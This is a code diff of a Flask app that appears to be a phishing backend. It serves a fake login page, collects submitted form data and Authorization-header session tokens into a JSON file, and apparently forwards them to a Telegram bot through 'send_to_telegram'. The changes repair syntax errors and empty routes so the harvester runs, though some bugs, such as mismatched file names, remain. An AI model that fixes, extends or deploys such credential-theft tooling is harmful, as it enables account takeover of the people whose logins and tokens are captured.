@@ -18,7 +18,7 @@ print("CWD:", os.getcwd())
 BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
 CHAT_ID = os.getenv("TG_CHAT_ID")
 
-app = Flask(__name__, template_folder='.')
+app = Flask(__name__, template_folder="templates")
 
 @app.before_request
 def init_data():
@@ -40,6 +40,7 @@ def index():
 
 @app.route('/login/login/<username>')
 def login(username):
+    return render_template("login.html")
     
 @app.route('/collect', methods=['POST'])
 def collect():
@@ -66,9 +67,9 @@ def send_to_telegram(data):
             
 def collect_sessions():
     try:
-         session_data = request.headers.get("Authorization")
+        session_data = request.headers.get("Authorization")
 
-        entry = {"token": session_data}
+        entry = {"token": session_data} 
 
         if os .path.exists("session.json"):
             with open("sessions.json", "r", encoding="utf-8") as f:
@@ -148,9 +149,11 @@ def notify(text: str) -> bool:
 
 @app.get("/form")
 def form_page():
+    return "ok"
 
 @app.get("/")
 def root():
+    return "ok"
         
 @app.route("/track-click", methods=["POST"])
 def track_click():
@@ -218,7 +221,8 @@ def submit():
             print("log write error:", e)
      
 @app.route('/thanks')
-def thanks(): 
+def thanks():
+    return "ok"
 
 @app.route("/test-notify")
 def test_notify():
@@ -230,4 +234,4 @@ def test_notify():
         print("TG >", r.status_code, r.text)
 if __name__ == "__main__":
         port = int(os.environ.get("PORT",8081))
-        app..run(host="0.0.0.0", port=port, debuge=True)
+        app.run(host="0.0.0.0", port=port, debug=True)
